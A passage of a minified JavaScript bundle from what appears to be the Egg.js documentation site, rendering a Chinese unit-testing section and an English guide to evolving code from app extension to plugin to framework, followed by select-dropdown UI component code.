SomeService;",lang:"js"}),r.a.createElement("h3",{id:"\u5355\u5143\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u5355\u5143\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5355\u5143\u6d4b\u8bd5"),r.a.createElement("p",null,"\u5355\u5143\u6d4b\u8bd5\u975e\u5e38\u91cd\u8981\uff0c\u6846\u67b6\u4e5f\u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-bin"},"egg-bin")," \u6765\u5e2e\u5f00\u53d1\u8005\u65e0\u75db\u7684\u7f16\u5199\u6d4b\u8bd5\u3002"),r.a.createElement("p",null,"\u6d4b\u8bd5\u6587\u4ef6\u5e94\u8be5\u653e\u5728\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u7684 test \u76ee\u5f55\u4e0b\uff0c\u5e76\u4ee5 ",r.a.createElement("code",null,"test.js")," \u4e3a\u540e\u7f00\u540d\uff0c\u5373 ",r.a.createElement("code",null,"{","app_root","}","/test/**/*.test.js"),"\u3002"),r.a.createElement(o["a"],{code:"// test/app/middleware/robot.test.js\nconst { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/app/middleware/robot.test.js', () => {\n  it('should block robot', () => {\n    return app\n      .httpRequest()\n      .get('/')\n      .set('User-Agent', 'Baiduspider')\n      .expect(403);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u7136\u540e\u914d\u7f6e\u4f9d\u8d56\u548c ",r.a.createElement("code",null,"npm scripts"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "test": "egg-bin test",\n    "cov": "egg-bin cov"\n  }\n}',lang:"json"}),r.a.createElement(o["a"],{code:"$ npm i egg-mock --save-dev",lang:"bash"}),r.a.createElement("p",null,"\u6267\u884c\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:"$ npm test",lang:"bash"}),r.a.createElement("p",null,"\u5c31\u8fd9\u4e48\u7b80\u5355\uff0c\u66f4\u591a\u8bf7\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"../core/unittest"},"\u5355\u5143\u6d4b\u8bd5"),"\u3002"),r.a.createElement("h2",{id:"\u540e\u8bb0"},r.a.createElement(l["AnchorLink"],{to:"#\u540e\u8bb0","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u540e\u8bb0"),r.a.createElement("p",null,"\u77ed\u77ed\u51e0\u7ae0\u5185\u5bb9\uff0c\u53ea\u80fd\u8bb2 Egg \u7684\u51b0\u5c71\u4e00\u89d2\uff0c\u6211\u4eec\u5efa\u8bae\u5f00\u53d1\u8005\u7ee7\u7eed\u9605\u8bfb\u5176\u4ed6\u7ae0\u8282\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5173\u4e8e\u9aa8\u67b6\u7c7b\u578b\uff0c\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../tutorials"},"\u9aa8\u67b6\u8bf4\u660e")),r.a.createElement("li",null,"\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u6269\u5c55\u673a\u5236\uff0c\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../basics/plugin"},"\u63d2\u4ef6"),"\u3002"),r.a.createElement("li",null,"\u4e00\u4e2a\u5927\u89c4\u6a21\u7684\u56e2\u961f\u9700\u8981\u9075\u5faa\u4e00\u5b9a\u7684\u7ea6\u675f\u548c\u7ea6\u5b9a\uff0c\u5728 Egg \u91cc\u6211\u4eec\u5efa\u8bae\u5c01\u88c5\u9002\u5408\u81ea\u5df1\u56e2\u961f\u7684\u4e0a\u5c42\u6846\u67b6\uff0c\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"../advanced/framework"},"\u6846\u67b6\u5f00\u53d1"),"\u3002"),r.a.createElement("li",null,"\u8fd9\u662f\u4e00\u4e2a\u6e10\u8fdb\u5f0f\u7684\u6846\u67b6\uff0c\u4ee3\u7801\u7684\u5171\u5efa\uff0c\u590d\u7528\u548c\u4e0b\u6c89\uff0c\u7adf\u7136\u53ef\u4ee5\u8fd9\u4e48\u7684\u65e0\u75db\uff0c\u5efa\u8bae\u9605\u8bfb ",r.a.createElement(l["Link"],{to:"../intro/progressive"},"\u6e10\u8fdb\u5f0f\u5f00\u53d1"),"\u3002"),r.a.createElement("li",null,"\u5199\u5355\u5143\u6d4b\u8bd5\u5176\u5b9e\u5f88\u7b80\u5355\u7684\u4e8b\uff0cEgg \u4e5f\u63d0\u4f9b\u4e86\u975e\u5e38\u591a\u7684\u914d\u5957\u8f85\u52a9\uff0c\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u5927\u5bb6\u6d4b\u8bd5\u9a71\u52a8\u5f00\u53d1\uff0c\u5177\u4f53\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"../core/unittest"},"\u5355\u5143\u6d4b\u8bd5"),"\u3002"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},KXzQ:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Egg provides both ",r.a.createElement(l["Link"],{to:"../basics/plugin"},"Plugin")," and ",r.a.createElement(l["Link"],{to:"../advanced/framework"},"Framework"),", and the former has two loading modes which are ",r.a.createElement("code",null,"path")," and ",r.a.createElement("code",null,"package"),". Then how should we choose?"),r.a.createElement("p",null,"Step-by-step example will be provided to demonstrate how to start coding development progressively."),r.a.createElement("p",null,"Find detail codes on ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive"},"eggjs/examples/progressive"),"."),r.a.createElement("h2",{id:"getting-started"},r.a.createElement(l["AnchorLink"],{to:"#getting-started","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Getting Started"),r.a.createElement("p",null,"Assume that we are writing a code to analyze UA to implement the function below:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.isAndroid")),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.isIOS"))),r.a.createElement("p",null,"You can easily write it down after previous tutorials, let's have a quick review:"),r.a.createElement("p",null,"Codes refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step1"},"step1"),"."),r.a.createElement("p",null,"Directory structure:"),r.a.createElement(o["a"],{code:"example-app\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 extend\n\u2502   \u2502   \u2514\u2500\u2500 context.js\n\u2502   \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 test\n\u2502   \u2514\u2500\u2500 index.test.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"Core code:"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nmodule.exports = {\n  get isIOS() {\n    const iosReg = /iphone|ipad|ipod/i;\n    return iosReg.test(this.get('user-agent'));\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"prototype-of-plugin"},r.a.createElement(l["AnchorLink"],{to:"#prototype-of-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prototype of Plugin"),r.a.createElement("p",null,"Obviously, the logic is universal that can be written as a plugin."),r.a.createElement("p",null,"But since function might not be perfect at the beginning, it might be difficult to maintain if encapsulated into a plugin directly."),r.a.createElement("p",null,"We can write the code as the format of plugin, but not separate out."),r.a.createElement("p",null,"Codes refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step2"},"step2"),"."),r.a.createElement("p",null,"New directory structure:"),r.a.createElement(o["a"],{code:"example-app\n\u251c\u2500\u2500 app\n\u2502   \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 config\n\u2502   \u2514\u2500\u2500 plugin.js\n\u251c\u2500\u2500 lib\n\u2502   \u2514\u2500\u2500 plugin\n\u2502       \u2514\u2500\u2500 egg-ua\n\u2502           \u251c\u2500\u2500 app\n\u2502           \u2502   \u2514\u2500\u2500 extend\n\u2502           \u2502       \u2514\u2500\u2500 context.js\n\u2502           \u2514\u2500\u2500 package.json\n\u251c\u2500\u2500 test\n\u2502   \u2514\u2500\u2500 index.test.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"Core code:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"app/extend/context.js")," move to ",r.a.createElement("code",null,"lib/plugin/egg-ua/app/extend/context.js"),".")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"lib/plugin/egg-ua/package.json")," declares plugin."))),r.a.createElement(o["a"],{code:'{\n  "eggPlugin": {\n    "name": "ua"\n  }\n}',lang:"json"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"config/plugin.js")," uses ",r.a.createElement("code",null,"path")," to mount the plugin.")),r.a.createElement(o["a"],{code:"// config/plugin.js\nconst path = require('path');\nexports.ua = {\n  enable: true,\n  path: path.join(__dirname, '../lib/plugin/egg-ua'),\n};",lang:"js"}),r.a.createElement("h2",{id:"extract-to-independent-plugin"},r.a.createElement(l["AnchorLink"],{to:"#extract-to-independent-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extract to Independent Plugin"),r.a.createElement("p",null,"The functions of module become better after a period of developing so we could extract it out as an independent plugin."),r.a.createElement("p",null,"We extract an egg-ua plugin and have a quick review as below. Details refer to ",r.a.createElement(l["Link"],{to:"../advanced/plugin"},"Plugin Development"),"."),r.a.createElement("p",null,"Directory structure:"),r.a.createElement(o["a"],{code:"egg-ua\n\u251c\u2500\u2500 app\n\u2502   \u2514\u2500\u2500 extend\n\u2502       \u2514\u2500\u2500 context.js\n\u251c\u2500\u2500 test\n\u2502   \u251c\u2500\u2500 fixtures\n\u2502   \u2502   \u2514\u2500\u2500 test-app\n\u2502   \u2502       \u251c\u2500\u2500 app\n\u2502   \u2502       \u2502   \u2514\u2500\u2500 router.js\n\u2502   \u2502       \u2514\u2500\u2500 package.json\n\u2502   \u2514\u2500\u2500 ua.test.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"Codes refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step3/egg-ua"},"step3/egg-ua"),"."),r.a.createElement("p",null,"Then modify the application, details refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step3/example-app"},"step3/example-app"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,"Remove directory ",r.a.createElement("code",null,"lib/plugin/egg-ua"),"."),r.a.createElement("li",null,"Declare dependencies ",r.a.createElement("code",null,"egg-ua")," in ",r.a.createElement("code",null,"package.json"),"."),r.a.createElement("li",null,"Change type to ",r.a.createElement("code",null,"package")," in ",r.a.createElement("code",null,"config/plugin.js"),".")),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.ua = {\n  enable: true,\n  package: 'egg-ua',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note\uff1aWe can use ",r.a.createElement("code",null,"npm link")," for local test before releasing the plugin. Details refer to ",r.a.createElement(l["Link"],{to:"https://docs.npmjs.com/cli/link"},"npm-link"),".")),r.a.createElement(o["a"],{code:"$ cd example-app\n$ npm link ../egg-ua\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("h2",{id:"finally-a-framework"},r.a.createElement(l["AnchorLink"],{to:"#finally-a-framework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Finally: A Framework"),r.a.createElement("p",null,"After repeating the process above, we accumulate a few plugins and configurations, and might find that most of our team projects are using them."),r.a.createElement("p",null,"At that time, you can consider abstracting them as a framework which is suitable for business scenarios."),r.a.createElement("p",null,"Firstly, abstract the example-framework as below. Let's have a quick review, details refer to ",r.a.createElement(l["Link"],{to:"../advanced/framework"},"Framework"),"."),r.a.createElement("p",null,"Directory structure:"),r.a.createElement(o["a"],{code:"example-framework\n\u251c\u2500\u2500 config\n\u2502   \u251c\u2500\u2500 config.default.js\n\u2502   \u2514\u2500\u2500 plugin.js\n\u251c\u2500\u2500 lib\n\u2502   \u251c\u2500\u2500 agent.js\n\u2502   \u2514\u2500\u2500 application.js\n\u251c\u2500\u2500 test\n\u2502   \u251c\u2500\u2500 fixtures\n\u2502   \u2502   \u2514\u2500\u2500 test-app\n\u2502   \u2514\u2500\u2500 framework.test.j.\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 index.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Codes refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step4/example-framework"},"example-framework"),"."),r.a.createElement("li",null,"Remove the dependencies of plugins such as ",r.a.createElement("code",null,"egg-ua")," and remove it from example-app, then configure them into the ",r.a.createElement("code",null,"package.json")," and ",r.a.createElement("code",null,"config/plugin.js")," of the framework.")),r.a.createElement("p",null,"Then modify the application, details refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step4/example-app"},"step4/example-app"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,"Remove ",r.a.createElement("code",null,"egg-ua")," in ",r.a.createElement("code",null,"config/plugin.js"),"."),r.a.createElement("li",null,"Remove ",r.a.createElement("code",null,"egg-ua")," in ",r.a.createElement("code",null,"package.json"),"."),r.a.createElement("li",null,"declare ",r.a.createElement("code",null,"example-framework")," in ",r.a.createElement("code",null,"package.json")," and configure the ",r.a.createElement("code",null,"egg.framework"),".")),r.a.createElement(o["a"],{code:'{\n  "name": "progressive",\n  "version": "1.0.0",\n  "private": true,\n  "egg": {\n    "framework": "example-framework"\n  },\n  "dependencies": {\n    "example-framework": "*"\n  }\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note\uff1aWe can use ",r.a.createElement("code",null,"npm link")," for local test before releasing the framework ",r.a.createElement(l["Link"],{to:"https://docs.npmjs.com/cli/link"},"npm-link"),".")),r.a.createElement(o["a"],{code:"$ cd example-app\n$ npm link ../egg-framework\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("h2",{id:"in-the-end"},r.a.createElement(l["AnchorLink"],{to:"#in-the-end","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"In the End"),r.a.createElement("p",null,"In conclusion, we can see how to make the framework evolution step by step which benefits from Egg's powerful plugin mechanism, code co-build, reusability and modularity."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"In general, put codes into ",r.a.createElement("code",null,"lib/plugin")," if they can be reused in the application.")),r.a.createElement("li",null,r.a.createElement("p",null,"Separate it into a ",r.a.createElement("code",null,"node module")," when plugin becomes stable.")),r.a.createElement("li",null,r.a.createElement("p",null,"Application with relatively reusable codes will work as a separate plugin.")),r.a.createElement("li",null,r.a.createElement("p",null,"Abstract it as framework to release after application become certain solutions of specified business scenario.")),r.a.createElement("li",null,r.a.createElement("p",null,"It would be a great improvement in the efficiency of teamwork after plugins were extracted, modularized and finally became a framework, because other projects could reuse codes by just using ",r.a.createElement("code",null,"npm install"),".")),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("strong",null,"Note\uff1aWhether it's the application/plugin/framework, unittest is necessary and try to reach 100% coverage"))))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},KaNj:function(e,t,n){var a=n("m/os"),r=n("N0Us"),l=n("TYe2"),o=n("wdLt"),i=n("G9w8"),c=n("MAgz").aTypedArrayConstructor;e.exports=function(e){var t,n,s,u,d,m,p=a(e),h=arguments.length,g=h>1?arguments[1]:void 0,f=void 0!==g,E=l(p);if(void 0!=E&&!o(E)){d=E.call(p),m=d.next,p=[];while(!(u=m.call(d)).done)p.push(u.value)}for(f&&h>2&&(g=i(g,arguments[2],2)),n=r(p.length),s=new(c(this))(n),t=0;n>t;t++)s[t]=f?g(p[t],t):p[t];return s}},KcxR:function(e,t,n){"use strict";n.d(t,"b",(function(){return Se})),n.d(t,"a",(function(){return xe}));var a=n("2EJr"),r=n("VGJu"),l=n("qPib"),o=n("3Qq0"),i=n("0YMn"),c=n("EJBU"),s=n("nzxN"),u=n("ezrb"),d=n("ZbH0"),m=n("FU0I"),p=n("VGn1"),h=n.n(p),g=n("paKd"),f=n("f82q"),E=n("4Sss"),b=n("abDE"),v=m["createContext"](null);function y(){return m["useContext"](v)}function k(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:10,t=m["useState"](!1),n=Object(i["a"])(t,2),a=n[0],r=n[1],l=m["useRef"](null),o=function(){window.clearTimeout(l.current)};m["useEffect"]((function(){return o}),[]);var c=function(t,n){o(),l.current=window.setTimeout((function(){r(t),n&&n()}),e)};return[a,c,o]}function w(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:250,t=m["useRef"](null),n=m["useRef"](null);function a(a){(a||null===t.current)&&(t.current=a),window.clearTimeout(n.current),n.current=window.setTimeout((function(){t.current=null}),e)}return m["useEffect"]((function(){return function(){window.clearTimeout(n.current)}}),[]),[function(){return t.current},a]}function x(e,t,n,a){var r=m["useRef"](null);r.current={open:t,triggerOpen:n,customizedTrigger:a},m["useEffect"]((function(){function t(t){var n;if(null===(n=r.current)||void 0===n||!n.customizedTrigger){var a=t.target;a.shadowRoot&&t.composed&&(a=t.composedPath()[0]||a),r.current.open&&e().filter((function(e){return e})).every((function(e){return!e.contains(a)&&e!==a}))&&r.current.triggerOpen(!1)}}return window.addEventListener("mousedown",t),function(){return window.removeEventListener("mousedown",t)}}),[])}var j=n("Nb2D"),S=n("Y6X2"),C=function(e){var t,n=e.className,a=e.customizeIcon,r=e.customizeIconProps,l=e.onMouseDown,o=e.onClick,i=e.children;return t="function"===typeof a?a(r):a,m["createElement"]("span",{className:n,onMouseDown:function(e){e.preventDefault(),l&&l(e)},style:{userSelect:"none",WebkitUserSelect:"none"},unselectable:"on",onClick:o,"aria-hidden":!0},void 0!==t?t:m["createElement"]("span",{className:h()(n.split(/\s+/).map((function(e){return"".concat(e,"-icon")})))},i))},A=C,L=function(e,t){var n,a,r=e.prefixCls,l=e.id,i=e.inputElement,c=e.disabled,s=e.tabIndex,u=e.autoFocus,p=e.autoComplete,g=e.editable,f=e.activeDescendantId,E=e.value,v=e.maxLength,y=e.onKeyDown,k=e.onMouseDown,w=e.onChange,x=e.onPaste,j=e.onCompositionStart,S=e.onCompositionEnd,C=e.open,A=e.attrs,L=i||m["createElement"]("input",null),T=L,N=T.ref,O=T.props,I=O.onKeyDown,P=O.onChange,R=O.onMouseDown,_=O.onCompositionStart,q=O.onCompositionEnd,M=O.style;return Object(d["c"])(!("maxLength"in L.props),"Passing 'maxLength' to input element directly may not work because input in BaseSelect is controlled."),L=m["cloneElement"](L,Object(o["a"])(Object(o["a"])(Object(o["a"])({type:"search"},O),{},{id:l,ref:Object(b["a"])(t,N),disabled:c,tabIndex:s,autoComplete:p||"off",autoFocus:u,className:h()("".concat(r,"-selection-search-input"),null===(n=L)||void 0===n||null===(a=n.props)||void 0===a?void 0:a.className),role:"combobox","aria-expanded":C,"aria-haspopup":"listbox","aria-owns":"".concat(l,"_list"),"aria-autocomplete":"list","aria-controls":"".concat(l,"_list"),"aria-activedescendant":f},A),{},{value:g?E:"",maxLength:v,readOnly:!g,unselectable:g?null:"on",style:Object(o["a"])(Object(o["a"])({},M),{},{opacity:g?null:0}),onKeyDown:function(e){y(e),I&&I(e)},onMouseDown:function(e){k(e),R&&R(e)},onChange:function(e){w(e),P&&P(e)},onCompositionStart:function(e){j(e),_&&_(e)},onCompositionEnd:function(e){S(e),q&&q(e)},onPaste:x})),L},T=m["forwardRef"](L);T.displayName="Input";var N=T;function O(e){return Array.isArray(e)?e:void 0!==e?[e]:[]}var I="undefined"!==typeof window&&window.document&&window.document.documentElement,P=I;function R(e){return void 0!==e&&null!==e}function _(e){return["string","number"].includes(Object(s["a"])(e))}function q(e){var t=void 0;return e&&(_(e.title)?t=e.title.toString():_(e.label)&&(t=e.label.toString())),t}function M(e,t){P?m["useLayoutEffect"](e,t):m["useEffect"](e,t)}function F(e){var t;return null!==(t=e.key)&&void 0!==t?t:e.value}var D=function(e){e.preventDefault(),e.stopPropagation()},U=function(e){var t=e.id,n=e.prefixCls,a=e.values,r=e.open,o=e.searchValue,c=e.autoClearSearchValue,s=e.inputRef,u=e.placeholder,d=e.disabled,p=e.mode,g=e.showSearch,f=e.autoFocus,E=e.autoComplete,b=e.activeDescendantId,v=e.tabIndex,y=e.removeIcon,k=e.maxTagCount,w=e.maxTagTextLength,x=e.maxTagPlaceholder,C=void 0===x?function(e){return"+ ".concat(e.length," ...")}:x,L=e.tagRender,T=e.onToggleOpen,O=e.onRemove,I=e.onInputChange,P=e.onInputPaste,R=e.onInputKeyDown,_=e.onInputMouseDown,U=e.onInputCompositionStart,z=e.onInputCompositionEnd,H=m["useRef"](null),B=Object(m["useState"])(0),W=Object(i["a"])(B,2),V=W[0],$=W[1],G=Object(m["useState"])(!1),X=Object(i["a"])(G,2),Q=X[0],K=X[1],J="".concat(n,"-selection"),Y=r||"multiple"===p&&!1===c||"tags"===p?o:"",Z="tags"===p||"multiple"===p&&!1===c||g&&(r||Q);function ee(e,t,n,a,r){return m["createElement"]("span",{className:h()("".concat(J,"-item"),Object(l["a"])({},"".concat(J,"-item-disabled"),n)),title:q(e)},m["createElement"]("span",{className:"".concat(J,"-item-content")},t),a&&m["createElement"](A,{className:"".concat(J,"-item-remove"),onMouseDown:D,onClick:r,customizeIcon:y},"\xd7"))}function te(e,t,n,a,l){var o=function(e){D(e),T(!r)};return m["createElement"]("span",{onMouseDown:o},L({label:t,value:e,disabled:n,closable:a,onClose:l}))}function ne(e){var t=e.disabled,n=e.label,a=e.value,r=!d&&!t,l=n;if("number"===typeof w&&("string"===typeof n||"number"===typeof n)){var o=String(l);o.length>w&&(l="".concat(o.slice(0,w),"..."))}var i=function(t){t&&t.stopPropagation(),O(e)};return"function"===typeof L?te(a,l,t,r,i):ee(e,l,t,r,i)}function ae(e){var t="function"===typeof C?C(e):C;return ee({title:t},t,!1)}M((function(){$(H.current.scrollWidth)}),[Y]);var re=m["createElement"]("div",{className:"".concat(J,"-search"),style:{width:V},onFocus:function(){K(!0)},onBlur:function(){K(!1)}},m["createElement"](N,{ref:s,open:r,prefixCls:n,id:t,inputElement:null,disabled:d,autoFocus:f,autoComplete:E,editable:Z,activeDescendantId:b,value:Y,onKeyDown:R,onMouseDown:_,onChange:I,onPaste:P,onCompositionStart:U,onCompositionEnd:z,tabIndex:v,attrs:Object(j["a"])(e,!0)}),m["createElement"]("span",{ref:H,className:"".concat(J,"-search-mirror"),"aria-hidden":!0},Y,"\xa0")),le=m["createElement"](S["a"],{prefixCls:"".concat(J,"-overflow"),data:a,renderItem:ne,renderRest:ae,suffix:re,itemKey:F,maxCount:k});return m["createElement"](m["Fragment"],null,le,!a.length&&!Y&&m["createElement"]("span",{className:"".concat(J,"-placeholder")},u))},z=U,H=function(e){var t=e.inputElement,n=e.prefixCls,a=e.id,r=e.inputRef,l=e.disabled,o=e.autoFocus,c=e.autoComplete,s=e.activeDescendantId,u=e.mode,d=e.open,p=e.values,h=e.placeholder,g=e.tabIndex,f=e.showSearch,E=e.searchValue,b=e.activeValue,v=e.maxLength,y=e.onInputKeyDown,k=e.onInputMouseDown,w=e.onInputChange,x=e.onInputPaste,S=e.onInputCompositionStart,C=e.onInputCompositionEnd,A=m["useState"](!1),L=Object(i["a"])(A,2),T=L[0],O=L[1],I="combobox"===u,P=I||f,R=p[0],_=E||"";I&&b&&!T&&(_=b),m["useEffect"]((function(){I&&O(!1)}),[I,b]);var M=!("combobox"!==u&&!d&&!f)&&!!_,F=q(R),D=function(){if(R)return null;var e=M?{visibility:"hidden"}:void 0;return m["createElement"]("span",{className:"".concat(n,"-selection-placeholder"),style:e},h)};return m["createElement"](m["Fragment"],null,m["createElement"]("span",{className:"".concat(n,"-selection-search")},m["createElement"](N,{ref:r,prefixCls:n,id:a,open:d,inputElement:t,disabled:l,autoFocus:o,autoComplete:c,editable:P,activeDescendantId:s,value:_,onKeyDown:y,onMouseDown:k,onChange:function(e){O(!0),w(e)},onPaste:x,onCompositionStart:S,onCompositionEnd:C,tabIndex:g,attrs:Object(j["a"])(e,!0),maxLength:I?v:void 0})),!I&&R?m["createElement"]("span",{className:"".concat(n,"-selection-item"),title:F,style:M?{visibility:"hidden"}:void 0},R.label):null,D())},B=H;function W(e){return![E["a"].ESC,E["a"].SHIFT,E["a"].BACKSPACE,E["a"].TAB,E["a"].WIN_KEY,E["a"].ALT,E["a"].META,E["a"].WIN_KEY_RIGHT,E["a"].CTRL,E["a"].SEMICOLON,E["a"].EQUALS,E["a"].CAPS_LOCK,E["a"].CONTEXT_MENU,E["a"].F1,E["a"].F2,E["a"].F3,E["a"].F4,E["a"].F5,E["a"].F6,E["a"].F7,E["a"].F8,E["a"].F9,E["a"].F10,E["a"].F11,E["a"].F12].includes(e)}var V=function(e,t){var n=Object(m["useRef"])(null),r=Object(m["useRef"])(!1),l=e.prefixCls,o=e.open,c=e.mode,s=e.showSearch,u=e.tokenWithEnter,d=e.autoClearSearchValue,p=e.onSearch,h=e.onSearchSubmit,g=e.onToggleOpen,f=e.onInputKeyDown,b=e.domRef;m["useImperativeHandle"](t,(function(){return{focus:function(){n.current.focus()},blur:function(){n.current.blur()}}}));var v=w(0),y=Object(i["a"])(v,2),k=y[0],x=y[1],j=function(e){var t=e.which;t!==E["a"].UP&&t!==E["a"].DOWN||e.preventDefault(),f&&f(e),t!==E["a"].ENTER||"tags"!==c||r.current||o||null===h||void 0===h||h(e.target.value),W(t)&&g(!0)},S=function(){x(!0)},C=Object(m["useRef"])(null),A=function(e){!1!==p(e,!0,r.current)&&g(!0)},L=function(){r.current=!0},T=function(e){r.current=!1,"combobox"!==c&&A(e.target.value)},N=function(e){var t=e.target.value;if(u&&C.current&&/[\r\n]/.test(C.current)){var n=C.current.replace(/[\r\n]+$/,"").replace(/\r\n/g," ").replace(/[\r\n]/g," ");t=t.replace(n,C.current)}C.current=null,A(t)},O=function(e){var t=e.clipboardData,n=t.getData("text");C.current=n},I=function(e){var t=e.target;if(t!==n.current){var a=void 0!==document.body.style.msTouchAction;a?setTimeout((function(){n.current.focus()})):n.current.focus()}},P=function(e){var t=k();e.target===n.current||t||"combobox"===c||e.preventDefault(),("combobox"===c||s&&t)&&o||(o&&!1!==d&&p("",!0,!1),g())},R={inputRef:n,onInputKeyDown:j,onInputMouseDown:S,onInputChange:N,onInputPaste:O,onInputCompositionStart:L,onInputCompositionEnd:T},_="multiple"===c||"tags"===c?m["createElement"](z,Object(a["a"])({},e,R)):m["createElement"](B,Object(a["a"])({},e,R));return m["createElement"]("div",{ref:b,className:"".concat(l,"-selector"),onClick:I,onMouseDown:P},_)},$=m["forwardRef"](V);$.displayName="Selector";var G=$,X=n("y+Tp"),Q=["prefixCls","disabled","visible","children","popupElement","containerWidth","animation","transitionName","dropdownStyle","dropdownClassName","direction","placement","dropdownMatchSelectWidth","dropdownRender","dropdownAlign","getPopupContainer","empty","getTriggerDOMNode","onPopupVisibleChange","onPopupMouseEnter"],K=function(e){var t=!0===e?0:1;return{bottomLeft:{points:["tl","bl"],offset:[0,4],overflow:{adjustX:t,adjustY:1}},bottomRight:{points:["tr","br"],offset:[0,4],overflow:{adjustX:t,adjustY:1}},topLeft:{points:["bl","tl"],offset:[0,-4],overflow:{adjustX:t,adjustY:1}},topRight:{points:["br","tr"],offset:[0,-4],overflow:{adjustX:t,adjustY:1}}}},J=function(e,t){var n=e.prefixCls,r=(e.disabled,e.visible),i=e.children,s=e.popupElement,u=e.containerWidth,d=e.animation,p=e.transitionName,g=e.dropdownStyle,f=e.dropdownClassName,E=e.direction,b=void 0===E?"ltr":E,v=e.placement,y=e.dropdownMatchSelectWidth,k=e.dropdownRender,w=e.dropdownAlign,x=e.getPopupContainer,j=e.empty,S=e.getTriggerDOMNode,C=e.onPopupVisibleChange,A=e.onPopupMouseEnter,L=Object(c["a"])(e,Q),T="".concat(n,"-dropdown"),N=s;k&&(N=k(s));var O=m["useMemo"]((function(){return K(y)}),[y]),I=d?"".concat(T,"-").concat(d):p,P=m["useRef"](null);m["useImperativeHandle"](t,(function(){return{getPopupElement:function(){return P.current}}}));var R=Object(o["a"])({minWidth:u},g);return"number"===typeof 